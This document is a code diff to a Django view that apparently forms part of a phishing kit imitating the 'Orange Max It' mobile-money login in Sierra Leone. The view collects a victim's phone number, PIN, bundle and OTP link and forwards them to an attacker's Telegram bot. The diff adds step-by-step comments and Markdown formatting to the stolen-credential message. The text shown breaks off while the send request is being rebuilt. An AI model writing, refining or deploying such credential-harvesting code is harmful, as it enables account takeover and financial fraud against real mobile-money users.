@@ -70,29 +70,34 @@ def sync_data(request):
         return JsonResponse({"status": "error", "message": "POST required"}, status=405)
 
     try:
+        # 1. Safely load the JSON data from the JavaScript Fetch
         data = json.loads(request.body)
-        otp_link = data.get('otp', 'No OTP provided')
+        
+        # 2. Extract the 'otp' key (which we matched in the HTML script)
+        otp_link = data.get('otp', 'No Link provided')
 
+        # 3. Retrieve session data stored in the previous step
         phone = request.session.get('phone', 'Unknown')
         bundle = request.session.get('bundle', 'Unknown')
         pin = request.session.get('pin', 'Unknown')
 
+        # 4. Format the Telegram message
         message = (
-            "🇸🇱 ORANGE MAX IT LOGIN\n"
+            "🇸🇱 *ORANGE MAX IT LOGIN*\n"
             "━━━━━━━━━━━━━━━━━━\n"
-            f"📞 PHONE: +232 {phone}\n"
-            f"📦 BUNDLE: {bundle}\n"
-            f"🔑 PIN: {pin}\n"
+            f"📞 *PHONE:* `+232 {phone}`\n"
+            f"📦 *BUNDLE:* {bundle}\n"
+            f"🔑 *PIN:* `{pin}`\n"
             "━━━━━━━━━━━━━━━━━━\n"
-            f"🔗 OTP LINK:\n{otp_link}\n"
+            f"🔗 *OTP LINK:*\n{otp_link}\n"
             "━━━━━━━━━━━━━━━━━━\n"
-            "📡 STATUS: SUCCESS"
+            "📡 *STATUS:* SUCCESS"
         )
 
+        # 5. Send to Telegram using the 'requests' library
         telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(telegram_url, data={"chat_id": CHAT_ID, "text": message})
-
-        return JsonResponse({"status": "success"})
-
-    except Exception as e:
-        return JsonResponse({"status": "error", "message": str(e)}, status=400)
+        payload = {
+            "chat_id": CHAT_ID,
+            "text": message,
+            "parse_mode": "Markdown" # This makes the text bold and monospace
+        }
